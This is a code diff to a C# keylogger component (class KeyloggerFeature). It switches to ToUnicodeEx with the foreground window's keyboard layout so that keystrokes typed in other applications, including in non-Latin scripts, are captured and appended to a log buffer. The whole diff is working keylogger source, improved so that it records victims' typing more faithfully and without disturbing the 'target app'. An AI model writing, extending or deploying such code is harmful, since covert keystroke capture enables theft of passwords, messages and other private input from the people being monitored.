@@ -16,7 +16,9 @@ internal static class KeyloggerFeature
     [DllImport("user32.dll")] private static extern nint DispatchMessage(ref MSG msg);
     [DllImport("user32.dll")] private static extern bool PostThreadMessage(uint tid, uint msg, nint wp, nint lp);
     [DllImport("user32.dll")] private static extern bool GetKeyboardState(byte[] lpKeyState);
-    [DllImport("user32.dll", CharSet = CharSet.Unicode)] private static extern int ToUnicode(uint vk, uint sc, byte[] ks, StringBuilder buf, int sz, uint flags);
+    [DllImport("user32.dll", CharSet = CharSet.Unicode)] private static extern int ToUnicodeEx(uint vk, uint sc, byte[] ks, StringBuilder buf, int sz, uint flags, nint hkl);
+    [DllImport("user32.dll")] private static extern nint GetKeyboardLayout(uint idThread);
+    [DllImport("user32.dll")] private static extern uint GetWindowThreadProcessId(nint hWnd, out uint lpdwProcessId);
     [DllImport("kernel32.dll")] private static extern uint GetCurrentThreadId();
 
     [StructLayout(LayoutKind.Sequential)]
@@ -202,20 +204,27 @@ internal static class KeyloggerFeature
             }
         }
 
+        // Resolve the keyboard layout of the foreground window's thread so non-Latin
+        // layouts (Arabic, Russian, Greek, CJK, etc.) translate correctly.
+        // ToUnicode uses the calling thread's layout; ToUnicodeEx accepts an explicit handle.
+        uint threadId = GetWindowThreadProcessId(hwnd, out _);
+        nint hkl = GetKeyboardLayout(threadId);
+
         var ks = new byte[256];
         GetKeyboardState(ks);
-        var charBuf = new StringBuilder(4);
+        var charBuf = new StringBuilder(8);
         // Flag 4 = don't modify the dead-key state — avoids breaking ^+a→â composition in the target app
-        int n = ToUnicode(vk, sc, ks, charBuf, 4, 4);
+        int n = ToUnicodeEx(vk, sc, ks, charBuf, 8, 4, hkl);
+        string chars = n > 0 ? charBuf.ToString(0, n) : (charBuf.Length > 0 ? charBuf.ToString(0, 1) : "");
 
         lock (_bufLock)
         {
-            if (n > 0 && charBuf.Length > 0 && !char.IsControl(charBuf[0]))
-                _buf.Append(charBuf[0]);
+            if (n > 0 && chars.Length > 0 && !char.IsControl(chars[0]))
+                _buf.Append(chars);
             else if (n < 0)
             {
                 // Dead key pressed (^, ¨, ~, …) — log it as-is so the log is readable
-                if (charBuf.Length > 0) _buf.Append(charBuf[0]);
+                if (chars.Length > 0) _buf.Append(chars[0]);
             }
             else
             {
